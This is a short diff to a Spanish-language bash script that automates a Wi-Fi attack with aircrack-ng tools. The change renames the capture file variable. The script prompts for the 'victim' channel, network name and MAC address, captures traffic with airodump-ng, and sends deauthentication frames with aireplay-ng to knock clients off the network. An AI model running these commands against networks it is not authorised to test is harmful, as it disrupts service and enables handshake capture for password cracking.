@@ -6,7 +6,7 @@ echo ""
 read -p "Hola $USER, ¿Quieres comenzar? (si / no): " firstDecision
 
 firstTerminal(){
-  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $name wlp2s0mon &
+  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $red wlp2s0mon &
 }
 
 aircrackInstall(){
@@ -83,7 +83,6 @@ case $firstDecision in
     read -p "Canal de la victima: " canal
     read -p "Nombre de la red: " red
     read -p "Direccion MAC: " mac
-    read -p "Nombre del archivo resultante: " name
     firstTerminal 
     sleep 5s 
     sudo aireplay-ng -0 10 -a $mac  -e $red wlp2s0mon
